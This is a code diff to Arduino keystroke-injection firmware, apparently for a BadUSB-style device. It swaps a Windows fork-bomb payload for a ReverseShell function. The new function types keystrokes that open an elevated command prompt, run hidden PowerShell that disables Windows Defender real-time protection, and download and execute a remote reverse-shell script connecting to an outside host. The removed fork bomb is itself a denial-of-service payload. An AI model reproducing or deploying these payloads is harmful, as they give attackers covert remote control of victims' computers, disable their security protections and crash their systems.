@@ -243,19 +243,45 @@ void Scanner() {
 
 }
 
-void ForkBomb() {
+void ReverseShell() {
+  
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(300);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
-  delay(100);
   Keyboard.releaseAll();
-  delay(1000);
-  Keyboard.println("cmd");
-  delay(3000);
-  Keyboard.println("MODE CON: COLS=15 LINES=1");
-  delay(2000);
-  Keyboard.println("COLOR EF");
-  delay(2000);
-  Keyboard.println("for /l %x in (1,1,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) do start");
+
+  delay(20);
+  // --> Opens Task Manager
+  Keyboard.print(F("taskmgr"));
+
+  delay(150);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('f');
+  Keyboard.press('n');
+  Keyboard.releaseAll();
+
+  delay(50);
+  // --> Starts CMD
+  Keyboard.print(F("cmd"));
+
+  typeKey(KEY_TAB);
+
+  // --> Turn On Admin Privileges
+  typeKey(' ');
+
+  // --> Run
+  typeKey(KEY_RETURN);
+
+  delay(20);
+  Keyboard.print(F("taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [192.168.1.210] [8080]\");"));
+
+  // Ending stream
+  Keyboard.end();
 
 }
 
